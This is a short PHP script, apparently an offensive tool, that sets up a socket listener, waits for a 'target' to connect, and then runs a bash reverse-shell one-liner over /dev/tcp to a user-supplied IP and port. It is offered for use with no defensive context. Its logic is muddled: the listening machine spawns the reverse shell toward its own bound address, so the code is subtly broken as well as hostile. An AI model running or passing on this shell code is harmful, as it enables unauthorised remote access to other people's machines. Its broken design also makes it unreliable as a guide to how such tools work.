<?php
// Prompt the user for the target IP and port
echo "Enter the IP: ";
$ip = trim(fgets(STDIN));

echo "Enter the port: ";
$port = trim(fgets(STDIN));

// Open a socket connection to the attacker machine
$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_bind($socket, $ip, $port);
socket_listen($socket);

echo "send the ip and port you entered to your target, for example: '1.2.3.4:4444'.";
echo "the ip is need to be your ip address!.";
echo "";

// Wait for the target machine to connect
echo "Waiting for target to connect...\n";
$client = socket_accept($socket);

// Get the IP address of the connected target
$targetIP = socket_getpeername($client, $targetPort);
echo "Target connected: $targetIP\n";

// Execute the reverse shell
$shell = 'bash -i >& /dev/tcp/'.$ip.'/'.$port.' 0>&1 2>&1';
exec($shell);

// Close the socket connection
socket_close($client);
socket_close($socket);
?>
